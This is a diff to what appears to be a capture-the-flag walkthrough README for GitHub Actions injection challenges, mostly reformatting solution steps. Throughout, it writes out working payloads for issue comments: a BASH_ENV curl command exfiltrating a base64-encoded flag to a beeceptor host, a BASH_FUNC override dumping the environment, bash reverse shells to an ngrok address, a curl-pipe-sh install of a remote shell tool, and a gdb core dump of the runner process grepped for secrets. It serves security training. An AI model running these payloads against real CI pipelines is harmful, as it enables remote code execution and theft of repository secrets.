@@ -137,7 +137,8 @@ PIP_CONSTRAINT=https://tdf123456.free.beeceptor.com/get-flag
 > - [Bash variables doc](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
 > - [Beeceptor](https://beeceptor.com/)
 > - [Beeceptor for the demo](https://app.beeceptor.com/console/tdf123456)
- 
+
+Body Issue Comment:
 ``` bash
 Not a release :(
 BASH_ENV=$(curl https://tdf123456.free.beeceptor.com?flag=$(echo "$FLAG" | base64))
@@ -149,6 +150,7 @@ BASH_ENV=$(curl https://tdf123456.free.beeceptor.com?flag=$(echo "$FLAG" | base6
 
 
 ### Using BASH_FUNC
+Body Issue Comment:
 ``` bash
 Not a release :(
 BASH_FUNC_echo%%=() { builtin echo "coucou $@" | printenv | base64 ;}
@@ -160,86 +162,67 @@ BASH_FUNC_echo%%=() { builtin echo "coucou $@" | printenv | base64 ;}
 
 
 # Chall 4
-## Setup (client side)
-### Listen with NC
-
+1. Open a terminal for setup (client side)
+2. Listen with NC
 ``` bash
 nc -lv 4444
 ```
- 
-### Setup ngrok
- 
+3. setup ngrok
 ``` bash
 ngrok tcp 4444
 ```
- 
-### Get ngrok IP to build payload
- 
+4. Get ngrok IP to build payload
 ``` bash
 dig <NGROK_DNS>
 ```
- 
-## Payload
+
 Body Issue Comment:
 ``` bash
+Where is my bash ??
 $(bash -i >& /dev/tcp/<NGROK_IP>/<NGROK_PORT> 0>&1)
 ```
- 
-## Fancy shell for lazy DevOps :)
- 
-``` bash
-curl -sSf https://sshx.io/get | sh -s run
-```
- 
-## Let's investigate!
- 
+5. Investigate in the runner 
 The directory `/home/runner/work/_temp` look interesting...
- <p align="right">(<a href="#readme-top">back to top</a>)</p>
+
+
+> [!TIP]
+> Fancy shell for lazy DevOps :)
+> ``` bash
+> curl -sSf https://sshx.io/get | sh -s run
+> ```
+<p align="right">(<a href="#readme-top">back to top</a>)</p>
 
 
 
 
 
 # Chall 5
- 
-### Listen with NC
-
+1. Open a terminal for setup (client side)
+2. Listen with NC
 ``` bash
 nc -lv 4444
 ```
- 
-### Setup ngrok
- 
+3. setup ngrok
 ``` bash
 ngrok tcp 4444
 ```
- 
-### Get ngrok IP to build payload
- 
+4. Get ngrok IP to build payload
 ``` bash
 dig <NGROK_DNS>
 ```
- 
-## Payload
-
 Body Issue Comment:
 ``` bash
 ; bash -i >& /dev/tcp/<NGROK_IP>/<NGROK_PORT> 0>&1
 ```
- 
-## Fancy shell for lazy DevOps :)
- 
-``` bash
-curl -sSf https://sshx.io/get | sh -s run
-```
- 
-## Let's dump!
- 
-### Let's check those secrets
- 
+5. Dump and check those secrets
 ``` bash
 sudo apt-get install -y gdb; sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{print $1}')"; grep -Eao '"[^"]+":\{"value":"[^"]*","isSecret":true\}' k.dump*
 ```
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
 
+> [!TIP]
+> Fancy shell for lazy DevOps :)
+> ``` bash
+> curl -sSf https://sshx.io/get | sh -s run
+> ```
+<p align="right">(<a href="#readme-top">back to top</a>)</p>
  
